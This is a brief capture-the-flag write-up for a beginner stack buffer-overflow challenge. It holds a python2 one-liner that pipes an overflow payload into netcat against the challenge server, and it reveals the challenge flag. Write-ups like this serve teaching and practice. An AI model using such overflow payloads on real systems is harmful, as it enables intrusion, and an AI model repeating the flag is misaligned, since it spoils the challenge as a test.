[../](../../)

# Simple bof (baby)

## PWN - Points: 39

> Want to learn the hacker's secret? Try to smash this buffer!
>
> 
>
> You need guidance? Look no further than to [Mr. Liveoverflow][1]. He puts out nice videos you should look if you haven't already
>
> 
>
> By: theKidOfArcrania
>
> 
>
> ```nc chal.utc-ctf.club 35235```
>
> 
>
> [1]: https://old.liveoverflow.com/binary_hacking/protostar/stack0.html
>
> [bof.c](bof.c)
>
> [stack0.html](stack0.html)
>

## Solution

	python2 -c "print('\x66\x6c\x61\x67'*13)" | nc chal.utc-ctf.club 35235

flag: `utc{buffer_0verflows_4re_c00l!}`